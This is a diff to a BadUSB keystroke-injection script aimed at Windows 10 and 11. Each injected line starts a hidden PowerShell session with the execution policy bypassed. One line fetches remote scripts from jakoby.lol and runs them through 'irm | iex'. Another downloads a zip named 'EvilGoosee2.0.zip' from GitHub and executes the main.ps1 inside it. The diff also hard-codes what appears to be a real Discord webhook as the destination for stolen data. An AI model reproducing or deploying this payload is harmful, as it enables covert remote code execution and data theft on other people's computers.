@@ -8,15 +8,13 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $dc='';irm https://jakoby.lol/hgw | iex ;irm jakoby.lol/f0x | iex
+STRING powershell -windowstyle hidden -w h -ep bypass $dc='https://discord.com/api/webhooks/1098026835234795600/aglpx9-3UA0IOXfeehWeseawcSeLzbXSkiYtB6yEqeRLAmgBm7zm0QPWecxz4fQu7vBX';irm https://jakoby.lol/hgw | iex ;irm jakoby.lol/f0x | iex;irm jakoby.lol/e8v | iex;
+DELAY 600
 ENTER
-
-REM     Fill in either variable or both to set your exfil method.
-REM     $db is the variable that holds your DropBox token.
-REM     $dc is the variable that holds your Discord webhook.   
-REM     If you are using DropBox, also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly.
+DELAY 200
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://jakoby.lol/1ae' -O "$D\hg.zip";Expand-Archive "$D\hg.zip" -Des $D -Force;. "$D\hg\main.ps1"
+STRING powershell -windowstyle hidden -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://github.com/cubestudioss/gOOSE/blob/main/EvilGoosee2.0.zip?raw=true' -O "$D\hg.zip";Expand-Archive "$D\hg.zip" -Des $D -Force;. "$D\hg\main.ps1"
+DELAY 200
 ENTER
